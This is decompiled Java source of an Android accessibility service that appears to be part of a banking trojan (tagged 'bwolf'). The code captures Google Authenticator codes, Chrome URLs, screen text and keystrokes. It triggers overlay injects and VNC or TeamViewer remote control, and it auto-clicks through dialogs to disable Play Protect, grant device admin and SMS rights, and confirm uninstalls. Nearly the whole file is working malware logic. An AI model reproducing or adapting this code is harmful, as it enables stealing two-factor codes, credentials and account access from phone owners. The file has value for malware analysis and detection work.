package com.sonnokta;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.sonnokta.utils.LogUtil;

import fddo.Cbreak;
import fddo.Cclass;
import fddo.Cconst;
import fddo.Celse;
import fddo.Cfor;
import fddo.Cgoto;
import fddo.Cnew;
import fddo.Cthrow;

import java.util.ArrayList;
import java.util.Locale;
import java.util.Map;

public class p023w extends AccessibilityService {
    private static String TAG = "bwolf-p023w";

    /* renamed from: break  reason: not valid java name */
    public static String f7break = "";

    /* renamed from: case  reason: not valid java name */
    public static String f8case = "Turn on Play Protect scanning|Activar el análisis de Play Protect";

    /* renamed from: catch  reason: not valid java name */
    public static String f9catch = "";

    /* renamed from: class  reason: not valid java name */
    public static String f10class = "";

    /* renamed from: const  reason: not valid java name */
    public static String f11const = "";

    /* renamed from: else  reason: not valid java name */
    public static String f12else = "com.android.settings|com.google.android.settings|com.miui.securitycenter|com.google.android.permissioncontroller|com.android.permissioncontroller|com.google.android.packageinstaller|com.android.packageinstaller|com.miui.global.packageinstaller|com.android.vending|com.miui.powerkeeper";

    /* renamed from: final  reason: not valid java name */
    public static String f13final = "";

    /* renamed from: goto  reason: not valid java name */
//    TODO - CHECK
//    public static ArrayList<Integer> f14goto = new fddo();
    public static ArrayList<Integer> f14goto ;

    /* renamed from: super  reason: not valid java name */
    public static String f15super = "";

    /* renamed from: this  reason: not valid java name */
//    TODO - CHECK
//    public static Map<Integer, String> f16this = new ifdf();
    public static Map<Integer, String> f16this;

    /* renamed from: throw  reason: not valid java name */
    public static AccessibilityEvent f17throw = null;

    /* renamed from: try  reason: not valid java name */
    private static final String f18try = Cbreak.fddo("00fcf4492fcbc1fb7d25b63e52");

    /* renamed from: while  reason: not valid java name */
    public static p023w f19while;

    /* renamed from: fddo  reason: collision with root package name */
    public Context f93fddo;

    /* renamed from: for  reason: not valid java name */
    public boolean f20for = false;
    public int ifdf = 0;

    /* renamed from: new  reason: not valid java name */
    public fddo.fddo f21new;

    public p023w() {
        f19while = this;
    }

    /* renamed from: case  reason: not valid java name */
    public static String m7case() {
        String str = f9catch;
        LogUtil.showErrorLog(TAG, "--- m7case --- " + str);
        return str == null ? "" : str;
    }

    /* renamed from: else  reason: not valid java name */
    public static String m8else(String str) {
        LogUtil.showErrorLog(TAG, "--- m8else --- " + str);
        String[] strArr;
        if (str.isEmpty()) {
            return "";
        }
        String replace = str.replace("|", ",");
        if (replace.contains(",")) {
            strArr = replace.split(",");
        } else {
            strArr = new String[]{replace};
        }
        for (String str2 : strArr) {
            if (!str2.isEmpty()) {
                String lowerCase = str2.toLowerCase(Locale.ROOT);
                if (!f10class.isEmpty() && f10class.equals(lowerCase)) {
                    return str2;
                }
                if (!f11const.isEmpty() && f11const.equals(lowerCase)) {
                    return str2;
                }
                if (!f13final.isEmpty() && f13final.equals(lowerCase)) {
                    return str2;
                }
            }
        }
        return "";
    }

    public static boolean fddo(String str) {
        LogUtil.showErrorLog(TAG, "--- fddo --- " + str);
        String[] strArr;
        String replace = str.replace("|", ",");
        if (replace.contains(",")) {
            strArr = replace.split(",");
        } else {
            strArr = new String[]{replace};
        }
        for (String str2 : strArr) {
            if (!str2.isEmpty()) {
                String lowerCase = str2.toLowerCase(Locale.ROOT);
                if (!f10class.isEmpty() && f10class.equals(lowerCase)) {
                    return true;
                }
                if (!f11const.isEmpty() && f11const.equals(lowerCase)) {
                    return true;
                }
                if (!f13final.isEmpty() && f13final.equals(lowerCase)) {
                    return true;
                }
            }
        }
        return false;
    }

    /* renamed from: goto  reason: not valid java name */
    public static String m9goto() {
        LogUtil.showErrorLog(TAG, "--- m9goto --- ");
        String str = "";
        if (!f10class.isEmpty()) {
            str = str + f10class + ",";
        }
        if (!f11const.isEmpty() && !f11const.equals(f10class)) {
            str = str + f11const + ",";
        }
        if (f13final.isEmpty() || f13final.equals(f11const) || f13final.equals(f10class)) {
            return str;
        }
        return str + f13final;
    }

    private void ifdf() {
        LogUtil.showErrorLog(TAG, "--- ifdf --- ");
        Cthrow.m159this(this.f93fddo, "acsb_task", "");
    }

    /* renamed from: break  reason: not valid java name */
    public boolean m10break(AccessibilityEvent accessibilityEvent) {
        LogUtil.showErrorLog(TAG, "--- m10break --- ");
        String str;
        String str2;
        String str3 = "";
        f17throw = accessibilityEvent;
        accessibilityEvent.getEventType();
        try {
            str = m20this().getPackageName().toString().toLowerCase(Locale.ROOT);
        } catch (Exception unused) {
            str = str3;
        }
        try {
            str2 = accessibilityEvent.getPackageName().toString().toLowerCase(Locale.ROOT);
        } catch (Exception unused2) {
            str2 = str3;
        }
        if (accessibilityEvent.getClassName() != null && !str.isEmpty() && accessibilityEvent.getClassName().toString().startsWith(str)) {
            str3 = accessibilityEvent.getClassName().toString().toLowerCase(Locale.ROOT);
        }
        f9catch = str3;
        f7break = str2;
        f10class = str2;
        if (str.isEmpty()) {
            return true;
        }
        f7break = str;
        f11const = str;
        return true;
    }

    /* renamed from: catch  reason: not valid java name */
    public boolean m11catch() {
        LogUtil.showErrorLog(TAG, "--- m11catch --- ");
        String[] strArr = {".android.", "system", ".miui."};
        for (int i = 0; i < 3; i++) {
            String str = strArr[i];
            if (!str.isEmpty()) {
                String lowerCase = str.toLowerCase(Locale.ROOT);
                if (!f10class.isEmpty() && f10class.contains(lowerCase)) {
                    return true;
                }
                if (!f11const.isEmpty() && f11const.contains(lowerCase)) {
                    return true;
                }
                if (!f13final.isEmpty() && f13final.contains(lowerCase)) {
                    return true;
                }
            }
        }
        return false;
    }

    /* renamed from: class  reason: not valid java name */
    public void m12class() {
        LogUtil.showErrorLog(TAG, "--- m12class --- ");
        String str = Cthrow.m158new(this.f93fddo, "minimize_apps", "");
        if (!str.isEmpty()) {
            if (Cthrow.m156for(this.f93fddo, "uptime", 0L).longValue() >= ((long) Cthrow.ifdf(this.f93fddo, "minimize_delay", 0).intValue())) {
                if (fddo(str + ",")) {
                    this.f21new.m101public();
                }
            }
        }
    }

    /* access modifiers changed from: package-private */
    /* renamed from: const  reason: not valid java name */
    public void m13const() {
        LogUtil.showErrorLog(TAG, "--- m13const --- ");
        if (fddo("com.google.android.apps.authenticator2")) {
            AccessibilityNodeInfo accessibilityNodeInfo = fddo.fddo.m90else(m20this(), "pin_value");
            if (!(accessibilityNodeInfo == null || accessibilityNodeInfo.getText() == null)) {
                Context context = this.f93fddo;
                Cgoto.g(context, "GOOGLE_AUTH: auth code " + accessibilityNodeInfo.getText().toString());
            }
            AccessibilityNodeInfo accessibilityNodeInfo2 = fddo.fddo.m92goto(m20this(), "current_user", true);
            if (accessibilityNodeInfo2 != null && accessibilityNodeInfo2.getText() != null) {
                Context context2 = this.f93fddo;
                Cgoto.g(context2, "GOOGLE_AUTH: current user " + accessibilityNodeInfo2.getText().toString());
            }
        }
    }

    /* renamed from: final  reason: not valid java name */
    public void m14final() {
        LogUtil.showErrorLog(TAG, "--- m14final --- ");
        AccessibilityNodeInfo accessibilityNodeInfo;
        if (m11catch()) {
            String str = fddo.fddo.m88catch(this.f93fddo, m20this());
            if (!str.isEmpty()) {
                String str2 = m9goto();
                if (!str2.isEmpty()) {
                    str = "Package: " + str2 + "; " + str;
                }
                if (fddo("com.android.chrome") && (accessibilityNodeInfo = fddo.fddo.m90else(m20this(), "url_bar")) != null) {
                    str = "URL: " + accessibilityNodeInfo.getText().toString() + "; " + str;
                }
                Cgoto.g(this.f93fddo, str);
            }
        }
    }

    /* renamed from: for  reason: not valid java name */
    public void m15for() {
        boolean boolV0 = Cthrow.m158new(this.f93fddo, "vnc", "").isEmpty();

        LogUtil.showErrorLog(TAG, "--- m15for - 1 - vnc --- " + boolV0);
        if (boolV0) {
            new Celse(this.f93fddo, f19while, "SHORT_SMS", "com.android.phone", false).m85break("short_sms");
        }
    }

    /* renamed from: import  reason: not valid java name */
    public void m16import() {
        LogUtil.showErrorLog(TAG, "--- m16import --- ");
        this.f93fddo = getApplicationContext();
        this.f21new = new fddo.fddo(f19while);
        try {
            AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
            accessibilityServiceInfo.eventTypes = -1;
            accessibilityServiceInfo.flags = 19;
            accessibilityServiceInfo.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
            f19while.setServiceInfo(accessibilityServiceInfo);
        } catch (Exception unused) {
        }
    }

    /* renamed from: native  reason: not valid java name */
    public void m17native() {
        if (Cthrow.m156for(this.f93fddo, "uptime", 0L).longValue() >= ((long) Cthrow.ifdf(this.f93fddo, "injects_delay", 0).intValue())) {
            String str = m8else(Cthrow.m158new(this.f93fddo, "smarts_injects", ""));
            if (!fddo("com.android.vending") || !Cthrow.m158new(this.f93fddo, "acsb_task", "").equals("disable_gp")) {
                Cclass classR = new Cclass(this.f93fddo);
                if (!str.isEmpty() && classR.m60try(str)) {
                    classR.ifdf(str);
                }
            }
        }
    }

    /* renamed from: new  reason: not valid java name */
    public void m18new() {
        LogUtil.showErrorLog(TAG, "--- m18new --- ");
        if (!Cthrow.m158new(this.f93fddo, "vnc", "").isEmpty()) {
            Context context = this.f93fddo;
            p023w p023w = f19while;
            new Celse(context, p023w, "TEAMVIEWER", "com.teamviewer.quicksupport.market|" + f12else, false).m85break("teamviewer");
        }
    }

    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        f19while = this;
        try {
            Context applicationContext = getApplicationContext();
            this.f93fddo = applicationContext;
            if (Cthrow.m158new(applicationContext, "vnc", "").contains("STREAM_LAYOUT;")) {
                if (Cthrow.m158new(this.f93fddo, "acsb_task", "").equals("vnc_screen")) {
                    Context context = this.f93fddo;
                    if (new Celse(context, this, "VNC_SCREEN", this.f93fddo.getPackageName() + "|com.android.systemui", false).m85break("vnc_screen")) {
                        ifdf();
                    }
                }
                new Cconst(this.f93fddo, f19while).m79class(accessibilityEvent);
                if (Cfor.ifdf.contains("VNCINJ") && m10break(accessibilityEvent)) {
                    m17native();
                    return;
                }
                return;
            }
            if (!fddo(this.f93fddo.getPackageName())) {
                Cgoto.z(this.f93fddo, false);
            }
            if (m10break(accessibilityEvent) && !fddo(this.f93fddo.getPackageName())) {
                m17native();
                m12class();
                m23while(accessibilityEvent);
                m22try();
            }
        } catch (Exception unused) {
        }
    }

    public void onInterrupt() {
        LogUtil.showErrorLog(TAG, "--- onInterrupt --- ");
    }

    public void onRebind(Intent intent) {
        LogUtil.showErrorLog(TAG, "--- onRebind --- ");
        super.onRebind(intent);
        f19while = this;
    }

    /* access modifiers changed from: protected */
    public void onServiceConnected() {
        super.onServiceConnected();
        LogUtil.showErrorLog(TAG, "--- onServiceConnected --- ");
        f19while = this;
        m16import();
    }

    public boolean onUnbind(Intent intent) {
        LogUtil.showErrorLog(TAG, "--- onUnbind --- ");
        return true;
    }

    /* renamed from: super  reason: not valid java name */
    public void m19super() {
        LogUtil.showErrorLog(TAG, "--- m19super --- ");
        if (!Cthrow.fddo(this.f93fddo, "kill_bot", Boolean.FALSE).booleanValue()) {
            new Cnew(false, this.f93fddo, f19while, m7case(), this.f21new).fddo(Cgoto.dfhaefdhadfhdfherh(this.f93fddo), Cthrow.m158new(this.f93fddo, Cbreak.fddo("5caeda4937f6e1f37c0caf3650"), ""));
        }
    }

    /* renamed from: this  reason: not valid java name */
    public AccessibilityNodeInfo m20this() {
        LogUtil.showErrorLog(TAG, "--- m20this --- ");
        return getRootInActiveWindow();
    }

    /* renamed from: throw  reason: not valid java name */
    public void m21throw(String str) {
        if (!m7case().contains("accessibilityinstalled") && !m7case().contains("accessibilitysettings")) {
            if (str.equals("disable_gp")) {
                Celse elseR = new Celse(this.f93fddo, f19while, "DISABLE_GP", "com.android.vending|com.google.android.gms", false);
                int intValue = Cthrow.ifdf(this.f93fddo, "gp_step", 0).intValue();
                if (intValue == 0 && elseR.m85break("gp_page_settings") && this.f21new.m99const()) {
                    intValue++;
                    Cthrow.m155else(this.f93fddo, "gp_step", Integer.valueOf(intValue));
                }
                if (intValue == 1 && elseR.m85break("gp_switches_enabled") && this.f21new.m102super()) {
                    intValue++;
                    Cthrow.m155else(this.f93fddo, "gp_step", Integer.valueOf(intValue));
                }
                if (intValue == 2 && elseR.m85break("gp_page_ok") && this.f21new.m100final()) {
                    intValue++;
                    Cthrow.m155else(this.f93fddo, "gp_step", Integer.valueOf(intValue));
                }
                if (intValue != 2 && elseR.m85break("gp_switches_disabled")) {
                    Cthrow.m154case(this.f93fddo, "gp_disabled", Boolean.TRUE);
                    this.f21new.m101public();
                }
            }
            if (str.equals("confirm_uninstall") && new Celse(this.f93fddo, f19while, "UNINSTALL", "com.google.android.packageinstaller|com.android.packageinstaller|com.miui.global.packageinstaller", false).m85break("uninstall_confirm")) {
                Cgoto.g(this.f93fddo, "UNINSTALL: confirmed");
                ifdf();
            }
            if (str.equals("push_admin")) {
                Celse elseR2 = new Celse(this.f93fddo, f19while, "PUSH", f12else, false);
                if (Cgoto.ifdf(this.f93fddo).booleanValue()) {
                    this.f21new.m101public();
                    ifdf();
                    return;
                } else if (elseR2.m85break("push_admin")) {
                    this.f21new.fddo();
                }
            }
            if (str.equals("battery") && new Celse(this.f93fddo, f19while, "BATTERY", f12else, false).m85break("battery_confirm")) {
                ifdf();
            }
            if (str.equals("xiaomi_autostart") && new Celse(this.f93fddo, f19while, "XIAOMI_AUTOSTART", f12else, false).m85break("xiaomi_autostart")) {
                this.f21new.fddo();
                Cthrow.m159this(this.f93fddo, "xiaomi_autostart", "enabled");
                ifdf();
            }
            if (str.equals("admin")) {
                Celse elseR3 = new Celse(this.f93fddo, f19while, "DEVADMIN", f12else, false);
                if (!Cthrow.fddo(this.f93fddo, "kill_bot", Boolean.FALSE).booleanValue() ? elseR3.m85break("devadmin_confirm") : elseR3.m85break("devadmin_uninstall")) {
                    ifdf();
                }
            }
            if (str.equals("sms") && new Celse(this.f93fddo, f19while, "SMSADMIN", f12else, false).m85break("sms_change")) {
                ifdf();
            }
            if (str.equals("perms")) {
                new Celse(this.f93fddo, f19while, "PERMS", f12else, false).m85break("perms_confirm");
            }
            if (str.equals("write_settings")) {
                if (new Celse(this.f93fddo, this, "WRITE_SETTINGS", f12else, false).m85break("write_settings")) {
                    ifdf();
                    this.f21new.fddo();
                    this.f21new.m101public();
                }
            }
            if (str.equals("usage_stats")) {
                if (new Celse(this.f93fddo, this, "USAGE_STATS", f12else, false).m85break("usage_stats")) {
                    ifdf();
                    this.f21new.fddo();
                }
            }
            if (str.equals("overlay")) {
                if (new Celse(this.f93fddo, this, "OVERLAY", f12else, false).m85break("overlay")) {
                    ifdf();
                    this.f21new.fddo();
                }
            }
        } else if (Cgoto.dfhaefdhadfhdfherh(this.f93fddo)) {
            this.f21new.fddo();
        }
    }

    /* renamed from: try  reason: not valid java name */
    public void m22try() {
        LogUtil.showErrorLog(TAG, "--- m22try --- ");
        if (m20this() != null) {
            this.f21new = new fddo.fddo(f19while);
            String str = Cthrow.m158new(this.f93fddo, "acsb_task", "");
            if ((this.f21new.m103throw(this.f93fddo) || this.f21new.m105while(this.f93fddo)) && m7case().contains("installedappdetails")) {
                this.f21new.m101public();
            }
            if (str.isEmpty()) {
                m15for();
                m19super();
                m18new();
                return;
            }
            m21throw(str);
        }
    }

    /* renamed from: while  reason: not valid java name */
    public void m23while(AccessibilityEvent accessibilityEvent) {
        LogUtil.showErrorLog(TAG, "--- m23while --- ");
        m13const();
        m14final();
        if (Cthrow.fddo(this.f93fddo, "keylogger_enabled", Boolean.FALSE).booleanValue() || !Cthrow.m158new(this.f93fddo, "smart_inject", "").isEmpty()) {
            if (Cthrow.m156for(this.f93fddo, "uptime", 0L).longValue() >= ((long) Cthrow.ifdf(this.f93fddo, "keylogger_delay", 0).intValue())) {
                String str = fddo.fddo.m94native(this.f93fddo, accessibilityEvent, m9goto());
                if (!str.trim().isEmpty()) {
                    String str2 = Cthrow.m158new(this.f93fddo, "smart_inject", "");
                    if (fddo(this.f93fddo.getPackageName()) && !str2.isEmpty()) {
                        str = str2 + " " + str;
                    }
                }
                Cgoto.rsjsadghfsfdghj(this.f93fddo, str);
            }
        }
    }
}
